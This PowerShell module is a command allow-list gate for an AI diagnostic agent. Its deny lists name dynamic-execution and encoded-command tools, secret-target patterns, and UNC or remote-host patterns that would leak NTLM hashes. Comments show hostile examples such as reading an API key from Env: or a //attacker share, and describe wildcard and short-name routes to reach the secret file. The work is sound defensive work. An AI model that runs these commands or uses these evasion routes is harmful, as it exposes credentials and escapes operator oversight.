# lib/allowlist.ps1 - command allow-list gate (security core, CLAUDE.md section 5, DESIGN.md section 5.1)
# Contract:
#   Get-LokiCommandClass -CommandLine <string> -> 'read' | 'mutate' | 'denied'
#     Classifies a PROPOSED command line. Conservative: only 'read' when provably read-only;
#     anything unrecognized -> 'mutate'. Order of checks (FIRST match wins):
#       1) Trim(); empty/whitespace-only -> 'denied'.
#       2) READ, ONLY IF the command is provably read-only: (a) it contains NONE of the unsafe
#          characters ; | & ` $ ( ) { } < > and no CR/LF, AND (b) its first whitespace token matches
#          a curated read pattern (Get-*, the pure-read list, or the arg-aware ipconfig/arp/route
#          rules). READ is checked BEFORE the deny list ON PURPOSE: a genuine read whose ARGUMENTS
#          merely contain a scary substring (a file named iex.log, a host named ii, 'cmd' inside a
#          path) must stay 'read', not fail closed. A clean read cannot execute or mutate regardless
#          of its argument text -- its command name is a read-only cmdlet/tool and there is no
#          separator/pipe/subexpression left (step 2a) to smuggle a second command.
#       3) DENY (defense-in-depth) for anything NOT a clean read: eval/dynamic-exec, encoded-command,
#          and shell-escape/arbitrary-exec patterns ($script:LokiDenyPatterns) -> 'denied'.
#       4) Otherwise -> 'mutate' (conservative default; a bare mutation like Remove-Item, or a bare
#          download, lands here and requires confirmation -- it is not blocked outright).
#     Arg-awareness: the FULL argument list is scanned, not just the first token, so a mutating switch
#     hidden after a read-looking flag cannot pass as read. ipconfig: read only bare or '/all'. arp:
#     read only when no -d/-s switch is present (and bare or -a/-g). route: read only when 'print' is
#     present and no -f/-p/add/delete/change token is -- 'arp -a -d x' and 'route print -f' (which
#     real arp.exe/route.exe still act on) are correctly 'mutate'.
#     KNOWN RESIDUAL of the pure classifier (ADR-0006): Get-* is trusted by naming convention; a same-named
#     hijacked function/alias/executable on PATH could mutate. The pure string classifier cannot detect that;
#     Resolve-LokiCommandDecision (below, in THIS module) closes it with a runtime Get-Command resolution check
#     (honor Get-* auto-read only for a real Cmdlet, not a Function/Alias/Application) as defense-in-depth.
#     Reason values returned by Get-LokiAllowDecision are STABLE MACHINE TOKENS (English) -- this
#     module does no i18n and produces no user-facing output; the caller renders/localizes.
#   Test-LokiCommandHasBlockingShellSyntax -CommandLine <string> -> [bool]
#     PURE. True iff the line carries a shell metacharacter ( ; | & ` $ ( ) { } < > ) or a CR/LF -- the step-2a
#     "not a single provable read" test of Get-LokiCommandClass, named ONCE so the classifier and the offline
#     agent's pipe-refusal feedback (issue #85) share one definition. Reports presence only; decides no class.
#   Get-LokiAllowDecision -CommandLine <string> -> [pscustomobject]{ CommandLine; Class;
#     AutoAllowed; RequiresConfirm; Blocked; Reason }
#     Thin caller-facing wrapper around Get-LokiCommandClass. AutoAllowed = (Class -eq 'read'),
#     RequiresConfirm = (Class -eq 'mutate'), Blocked = (Class -eq 'denied'). Reason is one of
#     'read-allowlisted' | 'mutation-requires-confirm' | 'denied'. NOTE: this is the WEAK wrapper -- it does the
#     string classification ONLY, none of the runtime blocks below. Engines gate with Resolve-LokiCommandDecision.
#   Resolve-LokiCommandDecision -CommandLine <string> -> [hashtable]{ CommandLine; Class; Reason }
#     THE runtime-safe gate both engines call (online via lib/claude.ps1 -> Get-LokiPreToolUseDecision, offline via
#     lib/offline-agent.ps1) -- ONE engine-agnostic decision, DESIGN.md section 5.1. Get-LokiCommandClass PLUS:
#     (1) the Get-* -> Get-Command Cmdlet-resolution check that closes the residual above (a hijacking
#     Function/Alias/Application, or an unresolvable name, downgrades read -> mutate); (1b) a NAME that resolves to the
#     secret home\.env WITHOUT the literal '.env' the deny below matches is not provably safe -- a WILDCARD glob
#     (home\.e*, home\*, home\[.]env) or the 8.3 SHORT NAME (home\ENV~1, an NTFS/exFAT alias of .env). A read carrying
#     * ? [ or a NAME~digit leaf is downgraded read -> mutate; a wildcard whose leaf globs specifically to '.env' is
#     HARD denied (issue #54; string-gate belt -- durable closure is storage-layer, tracked separately); (2) a hard
#     'denied' for any command carrying a non-space/tab control char, targeting the secret / process-env
#     ($script:LokiSecretTargetPatterns), or side-effecting/exfiltrating -- UNC in either slash direction, a
#     remote-target parameter, or a browser launch ($script:LokiReadSideEffectPatterns). Reason adds the machine tokens
#     read-downgraded-unresolved | read-downgraded-noncmdlet | read-downgraded-wildcard | read-downgraded-shortname |
#     nonascii-control-blocked | secret-target-blocked | read-side-effect-blocked. Deterministic given the command table; unit-tested by
#     mocking Get-Command. Use THIS, never Get-LokiAllowDecision, to gate a proposed command.
# CLAUDE.md section 5: allow-list, not deny-list, is the gate (read-only automatic, anything
# mutating requires confirmation); deny only defense-in-depth. Get-LokiCommandClass / Get-LokiAllowDecision are
# PURE string logic -- no environment calls, no external processes, no user-facing output; they only classify
# strings and stay table-testable without mocking. Resolve-LokiCommandDecision is the RUNTIME-SAFE layer on top and
# is the ONE function here that consults the runtime (Get-Command), tested by mocking it -- it still emits no
# user-facing output (stable English machine tokens only).
# ASCII-only file (CLAUDE.md section 1: BOM only required for non-ASCII source) -- no BOM.
Set-StrictMode -Version Latest

# --- DENY patterns (defense-in-depth, checked AFTER the read allow-list so they can never fail-close
#     a genuine read whose arguments merely contain one of these as a substring). Case-insensitive:
#     PowerShell's -match is case-insensitive by default. Each entry is its own array element with a
#     comment so a reviewer can audit the security boundary at a glance. ---
$script:LokiDenyPatterns = @(
    # -- eval / dynamic execution: running a string or scriptblock as code --
    'Invoke-Expression',
    '\biex\b',
    'Invoke-Command',
    '\bicm\b',
    '\[scriptblock\]',
    'ScriptBlock\]::Create',
    '\.invoke\s*\(',

    # -- encoded / obfuscated command: hides the real payload from this classifier --
    '-enc\b',
    '-encodedcommand\b',
    '-e\s',
    'FromBase64String',

    # -- shell-escape / arbitrary process exec: hands off to a different, unfiltered process --
    '\bcmd(\.exe)?\b',
    '\bStart-Process\b',
    '\bsaps\b',
    'Invoke-Item',
    '\bii\b',
    '^start(\.exe)?(\s|$)',      # the `start` alias for Start-Process (launches a program); Start-* cmdlets are unaffected
    '^&',                        # leading call operator: & <path> runs an arbitrary, un-gated program
    '^\.'                        # leading dot: dot-source (. script) or relative-path exec (.\foo) -- arbitrary code
)

# --- Curated read-only command names (first token only, ANY arguments allowed -- these native tools
#     and cmdlets have no state-changing invocation). Membership test (-in) is case-insensitive. ---
$script:LokiPureReadCommands = @(
    'hostname', 'whoami', 'getmac', 'systeminfo', 'ver',
    'netstat', 'nbtstat', 'tracert', 'pathping', 'nslookup', 'ping',
    'tasklist', 'driverquery',
    'Test-NetConnection', 'Test-Connection', 'Resolve-DnsName',
    'Test-Path', 'Resolve-Path', 'Select-String'
)

function Test-LokiCommandHasBlockingShellSyntax {
    # PURE. True iff the command line carries a shell metacharacter -- a pipe |, a separator ; or &, a
    # subexpression/grouping ( ) { }, a redirection < >, a backtick escape `, or a $ expansion -- or a CR/LF
    # newline. Any of these means the line is NOT a single, provably-read command: a whitespace tokenizer could
    # no longer guarantee the first token is the whole command (a second command could hide behind a separator or
    # inside a subexpression). This is step 2a of Get-LokiCommandClass extracted as the ONE named definition of
    # that character set, so the classifier (which REFUSES such a line as non-read) and the offline agent's refusal
    # feedback (which tells the model to resend a single unpiped cmdlet, issue #85) reference the same set and can
    # never drift. It reports the PRESENCE of blocking syntax only; it does NOT decide read/mutate/denied.
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$CommandLine)
    return ($CommandLine -match '[;|&`$(){}<>]') -or ($CommandLine -match '[\r\n]')
}

function Get-LokiCommandClass {
    param(
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$CommandLine
    )

    # Step 1: empty/whitespace-only -> denied.
    $c = $CommandLine.Trim()
    if ([string]::IsNullOrEmpty($c)) {
        return 'denied'
    }

    # Step 2: READ (checked BEFORE deny -- see header). Only if both (a) and (b) hold.
    # (a) No unsafe separator/pipe/subexpression/redirection/scriptblock character, and no newline.
    #     Test-LokiCommandHasBlockingShellSyntax (above) is the ONE definition of that set, so this refusal and
    #     the offline agent's "resend one plain cmdlet" feedback can never drift apart (issue #85).
    if (-not (Test-LokiCommandHasBlockingShellSyntax -CommandLine $c)) {
        # Safe to tokenize by whitespace now: step 2a guaranteed no separator hides a second command.
        $tokens = $c -split '\s+'
        $first = $tokens[0]
        $cmdArgs = @()
        if ($tokens.Count -gt 1) {
            $cmdArgs = $tokens[1..($tokens.Count - 1)]
        }

        $isRead = $false

        # (b) the first token matches a curated read-only pattern.
        # CultureInvariant is load-bearing, not decoration: -match folds case using the CURRENT CULTURE, and in
        # tr-TR/az 'I' folds to the dotless 'i' (U+0131), which is NOT in [A-Za-z]. On a Turkish host 'Get-ChildItem'
        # / 'Get-CimInstance' / 'Get-Item' therefore stopped matching and were classified 'mutate' -- Loki's own
        # read-only diagnostics denied on the machine it was brought to diagnose. Case-insensitivity itself is
        # INTENDED here (PowerShell command names are case-insensitive: 'get-process' is a legal invocation), so
        # -cmatch would be the wrong fix -- it would reject the lowercase spelling instead. Keep IgnoreCase, drop the
        # culture. Verified in a real tr-TR process, before and after.
        if ([regex]::IsMatch($first, '^Get-[A-Za-z][A-Za-z0-9]*$', 'IgnoreCase,CultureInvariant')) {
            # Any Get-* cmdlet, any arguments -- Get is the read verb. See KNOWN RESIDUAL in header.
            $isRead = $true
        }
        elseif ($first -in $script:LokiPureReadCommands) {
            # Pure-read command, any arguments.
            $isRead = $true
        }
        elseif ($first -ieq 'ipconfig') {
            # No args, or the only arg is /all. /release /renew /flushdns /registerdns -> NOT read.
            if ($cmdArgs.Count -eq 0) {
                $isRead = $true
            }
            elseif (($cmdArgs.Count -eq 1) -and ($cmdArgs[0] -ieq '/all')) {
                $isRead = $true
            }
        }
        elseif ($first -ieq 'arp') {
            # -d (delete) and -s (add) are the only mutating arp switches. Scan the WHOLE arg list so
            # 'arp -a -d <ip>' -- which arp.exe still processes -- is not mis-read as read.
            $arpMutates = @($cmdArgs | Where-Object { ($_ -ieq '-d') -or ($_ -ieq '-s') }).Count -gt 0
            if (-not $arpMutates) {
                if ($cmdArgs.Count -eq 0) {
                    $isRead = $true
                }
                elseif (($cmdArgs[0] -ieq '-a') -or ($cmdArgs[0] -ieq '-g')) {
                    $isRead = $true
                }
            }
        }
        elseif ($first -ieq 'route') {
            # 'print' is the only read subcommand; -f (flush) mutates even alongside print, and
            # -p/add/delete/change mutate. Scan the whole arg list, not just the first token.
            $routeMutates = @($cmdArgs | Where-Object {
                    ($_ -ieq '-f') -or ($_ -ieq '-p') -or ($_ -ieq 'add') -or ($_ -ieq 'delete') -or ($_ -ieq 'change')
                }).Count -gt 0
            $routeHasPrint = @($cmdArgs | Where-Object { $_ -ieq 'print' }).Count -gt 0
            if ($routeHasPrint -and (-not $routeMutates)) {
                $isRead = $true
            }
        }

        if ($isRead) {
            return 'read'
        }
    }

    # Step 3: DENY (defense-in-depth) for anything that is NOT a clean read. First match wins.
    foreach ($pattern in $script:LokiDenyPatterns) {
        if ($c -match $pattern) {
            return 'denied'
        }
    }

    # Step 4: conservative default -- anything not provably read-only is a mutation candidate.
    return 'mutate'
}

function Get-LokiAllowDecision {
    param(
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$CommandLine
    )

    $class = Get-LokiCommandClass -CommandLine $CommandLine

    $reason = 'denied'
    if ($class -eq 'read') {
        $reason = 'read-allowlisted'
    }
    elseif ($class -eq 'mutate') {
        $reason = 'mutation-requires-confirm'
    }

    return [pscustomobject]@{
        CommandLine     = $CommandLine
        Class           = $class
        AutoAllowed     = ($class -eq 'read')
        RequiresConfirm = ($class -eq 'mutate')
        Blocked         = ($class -eq 'denied')
        Reason          = $reason
    }
}

# ===================================================================================================================
# Runtime-safe enforcement layer (moved here from lib/claude.ps1 on 2026-07-18, issue #50). Get-LokiCommandClass /
# Get-LokiAllowDecision above are the PURE string classifier; Resolve-LokiCommandDecision below is the RUNTIME-SAFE
# gate the engines actually call. It adds what a pure string classifier CANNOT express: a Get-Command Cmdlet-
# resolution check (closing the ADR-0006 Get-* residual) plus secret-target / side-effect denies. It lives HERE,
# not in an engine module, so the ONE gate is engine-agnostic -- the online hook (lib/claude.ps1 ->
# Get-LokiPreToolUseDecision) and the offline agent (lib/offline-agent.ps1) both call this same decision, matching
# DESIGN.md section 5.1 ("one allow-list engine for both"). ADR-0006 / ADR-0007 / ADR-0021.
# ===================================================================================================================

# Secret-target deny (defense in depth -- adversarial review, ADR-0007). The pure classifier above is engine-agnostic
# and trusts any Get-* by verb, so on its own it would auto-allow a genuine read cmdlet pointed at the process
# environment or the secret-at-rest file -- letting a model read the very API key the online engine runs under and
# surface it. These patterns block any otherwise-read command that targets the Env: PSDrive, a .env file, or a
# DRIVE-QUALIFIED root-level home\ directory (issue #56). Case-insensitive (-match default). Naming a credential
# VARIABLE is blocked too, but ordinally and from the one list in lib/auth.ps1 -- see the note at the end of the array.
# Deliberately broad (fail-closed): blocking an unrelated *.env read, or a root-level home\ read on some data drive,
# is an acceptable cost for a read-only diagnosis.
$script:LokiSecretTargetPatterns = @(
    '\bEnv:',                    # the Env: PSDrive: Get-ChildItem Env:, Get-Item Env:\ANTHROPIC_API_KEY, ...
    '\.env\b',                   # the secret-at-rest file (home\.env), absolute or relative
    # A DRIVE-QUALIFIED root-level home\ dir (E:home\, E:\home\, E:home, E:.\home\, E:..\home\*, E:home\ENV~1). The
    # secret lives at <stickdrive>:\home\.env (AppRoot = the stick's drive root, DESIGN.md). A drive-relative path
    # 'X:home\...' (or 'X:.\home\...', 'X:..\home\...') resolves against drive X's OWN current directory -- which
    # defaults to that drive's ROOT, and .\ / ..\ clamp there -- REGARDLESS of the child process cwd, so it reaches the
    # stick secret even from the System32-pinned child (issue #56 review); and the leaf rule below would only DOWNGRADE
    # the 8.3/bare-* forms to a confirmable mutate. Hard-deny every drive-qualified form whose FIRST segment (after any
    # .\ / ..\ / separators) is home. Note: this matches home only at the drive ROOT, so a DEEP path like
    # C:\Users\x\home\log is NOT over-blocked, and plain relative 'home\...' (no drive) is left to the cwd pin (ADR-0023,
    # it does not resolve to the stick from a System32 cwd; denying it would over-block and is unnecessary).
    '[A-Za-z]:(?:[\\/]|\.{1,2}[\\/])*home(?:[\\/]|$|[\s=,;''"()])',
    'GetEnvironmentVariable'     # .NET [*.Environment]::GetEnvironmentVariable(s)(...) -- reads the process env directly
    # The credential NAMES used to sit here as three more regexes. They moved to lib/auth.ps1 and are now matched by
    # Test-LokiCredentialTarget in Resolve-LokiCommandDecision below (ADR-0027), for two measured reasons. (1) Content:
    # three of the eight names Loki knows were listed, so a dump grep for the Bedrock bearer token classified as a
    # plain read. (2) Comparison: -match folds case by the CURRENT CULTURE, and under tr-TR ToLower of a capital I is
    # the dotless U+0131 -- so the two patterns whose names carry that letter did not match their own lowercase form
    # (measured in a fresh 5.1 process; the same trap this file already documents for its Get-* pattern). An ordinal
    # comparison never folds anything, and there is nothing regex-shaped about a variable name.
    # (No name is spelled here on purpose -- tests/auth.Tests.ps1 fails any file but lib/auth.ps1 that quotes one.)
)

# Side-effecting/exfiltrating "read" patterns (defense in depth -- adversarial review, ADR-0007, extended 2026-07-18
# by the offline-agent review, ADR-0006 refinement). A command can classify as a provably-local read yet still reach
# an EXTERNAL host and leak the NetNTLM hash / beacon. Block any otherwise-read command that: reaches a UNC path in
# EITHER slash direction; names a remote target parameter; or launches the browser (Get-Help/-Online). Case-insensitive
# (-match default). These live in the SHARED gate, so they harden Claude Code and the offline agent at once.
$script:LokiReadSideEffectPatterns = @(
    '\\\\',                          # UNC path with backslashes (\\host\share) -> forces SMB auth, leaks NetNTLM
    '(?:^|[\s=,;''"(])[\\/]{2}',     # UNC via forward/mixed slashes (//host, /\host): .NET/GetPathRoot normalizes these
                                     #   to a UNC too, so `Get-Content //attacker/share` still coerces SMB/NTLM auth. Anchored
                                     #   at a token boundary and NOT preceded by ':' -> http:// and inline // are spared;
                                     #   the danger is a UNC at a path-root position (offline-agent review 2026-07-18).
    '\s-computer',                   # -ComputerName / -Computer on a read cmdlet (Get-CimInstance/-Service/-WinEvent/
                                     #   -WmiObject) -> remote WinRM/DCOM auth to an attacker host -> NetNTLM leak. Native
                                     #   ping/tracert (bare host) and positional Test-NetConnection stay allowed.
    '\s-cn\b',                       # the -ComputerName alias
    '\s-cimsession\b',               # -CimSession -> a remote CIM session
    '\s-connectionuri\b',            # -ConnectionUri -> an explicit WSMan endpoint
    '\bGet-Help\b',                  # Get-Help -Online opens the default browser (external process + network)
    '\s-online\b'                    # the -Online switch on any read command (browser launch)
)

function Resolve-LokiCommandDecision {
    param(
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$CommandLine
    )

    $class = Get-LokiCommandClass -CommandLine $CommandLine
    $reason = 'mutation-requires-confirm'
    if ($class -eq 'denied') { $reason = 'denied' }
    elseif ($class -eq 'read') { $reason = 'read-allowlisted' }

    if ($class -eq 'read') {
        # The classifier already guaranteed no unsafe char/newline for a 'read', so whitespace tokenizing is safe.
        $first = ($CommandLine.Trim() -split '\s+')[0]

        # The Get-* naming-convention branch is the ONLY read path trusted by convention rather than by an explicit
        # name (ADR-0006 residual). Verify at runtime that the name really resolves to a Cmdlet -- a hijacking
        # Function/Alias/Application earlier on PATH, or an unresolvable name, is NOT provably safe -> downgrade.
        #
        # CultureInvariant, and this is the SECURITY-relevant half of the pair (the other is Get-LokiCommandClass's
        # identical pattern ABOVE in this same file): this regex decides whether the runtime check RUNS AT ALL. -match
        # folds case by the current culture, so under tr-TR 'Get-ChildItem' stops matching and the Cmdlet verification
        # is SILENTLY SKIPPED -- a hijacking Function named Get-ChildItem would then stay 'read'. Today the two patterns
        # fail together (the classifier never calls this 'read'), so the pair is consistent and fails closed; fixing
        # only ONE of them would open exactly that hole. They must stay identical -- if you touch one, touch both.
        if ([regex]::IsMatch($first, '^Get-[A-Za-z][A-Za-z0-9]*$', 'IgnoreCase,CultureInvariant')) {
            $resolved = Get-Command -Name $first -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($null -eq $resolved) {
                $class = 'mutate'; $reason = 'read-downgraded-unresolved'
            }
            elseif ($resolved.CommandType -ne 'Cmdlet') {
                $class = 'mutate'; $reason = 'read-downgraded-noncmdlet'
            }
        }
    }

    # Name-based secret-target evasion of the literal '\.env\b' deny (adversarial review 2026-07-19, issue #54).
    # A read is classified by its command NAME and a literal unsafe-char check that does NOT include the wildcard
    # metacharacters * ? [ -- and the deny below is the literal '\.env\b'. Two families of a NAME that resolves to the
    # secret home\.env WITHOUT containing the literal '.env':
    #   (a) WILDCARDS (home\.e*, home\.en?, home\[.]env, home\*, Select-String -Path home\*env*) -- the glob picks
    #       which file is read, and can pick .env;
    #   (b) the 8.3 SHORT NAME (home\ENV~1) -- an NTFS/exFAT filesystem alias of .env, no wildcard and no '.env'.
    # Neither is provably safe. Close it here, on read OR mutate (a mutate like `Remove-Item home\.e*` targeting the
    # secret must hard-deny, never merely confirm), path-form & case independent. NOTE (belt-and-suspenders): a string
    # gate cannot enumerate EVERY filesystem alias (8.3, hardlink, ADS, symlink); the durable fix is storage-layer
    # (the secret must not be readable by any name from the agent cwd) -- tracked separately.
    if ($class -ne 'denied') {
        # First whitespace token is the command name (metachars there are not path targets); scan the argument tokens.
        # We only SPLIT and INSPECT -- never execute -- so this is safe even for a 'mutate' that carries unsafe chars.
        $argTokens = @($CommandLine.Trim() -split '\s+' | Select-Object -Skip 1)
        $sawWildcard  = $false
        $sawShortName = $false
        foreach ($tok in $argTokens) {
            # Leaf = last path segment. Strip TRAILING separators first (so 'home\.e*\' -> leaf '.e*', not '' -- an
            # empty leaf would silently skip the hard-deny) and surrounding quotes ("home\.e*" -> .e*).
            $leaf = (($tok.TrimEnd('\', '/', '"', "'") -split '[\\/]')[-1]).Trim('"', "'")
            if ($leaf -match '[*?\[]') {
                $sawWildcard = $true
                # Secret-specific: the leaf globs to the secret filename '.env' but NOT to an arbitrary safe name. A
                # bare '*' matches BOTH (everything), so it is NOT hard-denied -- it is downgraded below. Leaf-only +
                # IgnoreCase => independent of the path prefix (home\, .\, absolute) and of casing.
                try {
                    $wp = [System.Management.Automation.WildcardPattern]::new($leaf, [System.Management.Automation.WildcardOptions]::IgnoreCase)
                    if ($wp.IsMatch('.env') -and (-not $wp.IsMatch('safe.txt'))) {
                        $class = 'denied'; $reason = 'secret-target-blocked'
                        break
                    }
                }
                catch {
                    # A malformed wildcard near the secret is not provably safe -> fall through to the downgrade below
                    # (never auto-allowed); do not throw out of the gate.
                    $null = $_
                }
            }
            elseif ($leaf -match '~[0-9]') {
                # 8.3 short name (NAME~digit): a filesystem alias that can name the secret (.env -> ENV~1) with no
                # wildcard and no literal '.env'. Cannot tell ENV~1 (the secret) from PROGRA~1 at the string level ->
                # not provably safe -> out of auto-allow (downgrade). The durable closure is storage-layer (above).
                $sawShortName = $true
            }
        }
        if ($class -eq 'read' -and ($sawWildcard -or $sawShortName)) {
            # Not secret-specific, but a wildcard/short-name read is not provably targeting a safe file -> out of
            # auto-allow. Headless/offline refuse a mutate; interactive may confirm it (the operator sees the name).
            $class = 'mutate'
            $reason = if ($sawWildcard) { 'read-downgraded-wildcard' } else { 'read-downgraded-shortname' }
        }
    }

    # Online-enforcement defense in depth on anything NOT already denied -- i.e. read OR mutate (adversarial
    # review, ADR-0007/0008). Applied to 'mutate' too, not just 'read': `chat` (ADR-0008) turns a mutate into a
    # confirmable 'ask', so a mutate that targets the secret, reaches a UNC path, or carries a control char must
    # become a HARD 'denied' here -- never merely confirmable. (For the read-only headless ask/scan a mutate was
    # denied anyway, so this only tightens; it never loosens.)
    if ($class -ne 'denied') {
        # (a) Reject non-space/tab whitespace or control characters. The pure classifier's unsafe-char check is
        #     ASCII-only while its tokenizer is Unicode-aware, so a U+2028/NBSP/control char could ride along; a
        #     provably-safe command never needs one. Fail closed rather than trust the mismatch.
        if ($CommandLine -match '[^\S \t]' -or $CommandLine -match '[\x00-\x08\x0E-\x1F\x7F]') {
            $class = 'denied'; $reason = 'nonascii-control-blocked'
        }
    }
    if ($class -ne 'denied') {
        # (b) Secret-target: any command (read OR a confirmable mutate) that reaches the process environment or the
        #     secret file would expose/exfiltrate the API key the engine runs under -> hard block, never confirm.
        foreach ($pat in $script:LokiSecretTargetPatterns) {
            if ($CommandLine -match $pat) {
                $class = 'denied'; $reason = 'secret-target-blocked'
                break
            }
        }
        # ...and the credential NAMES, from the one list in lib/auth.ps1 (ADR-0027). Separate from the patterns above
        # because these are literal names compared ORDINALLY, not regexes: see the note on the array above. The
        # patterns above already block the MECHANISMS (Env: drive, .env file, GetEnvironmentVariable); this blocks
        # naming a credential in any other target -- a grep of a collected dump, a config, a shell history.
        # Called, not read at file scope: lib/*.ps1 is dot-sourced alphabetically and auth.ps1 loads after this file.
        if (($class -ne 'denied') -and (Test-LokiCredentialTarget -Text $CommandLine)) {
            $class = 'denied'; $reason = 'secret-target-blocked'
        }
    }
    if ($class -ne 'denied') {
        # (c) Side-effecting/exfiltrating command (UNC/NTLM, browser launch) -- read OR mutate.
        foreach ($pat in $script:LokiReadSideEffectPatterns) {
            if ($CommandLine -match $pat) {
                $class = 'denied'; $reason = 'read-side-effect-blocked'
                break
            }
        }
    }

    return @{ CommandLine = $CommandLine; Class = $class; Reason = $reason }
}
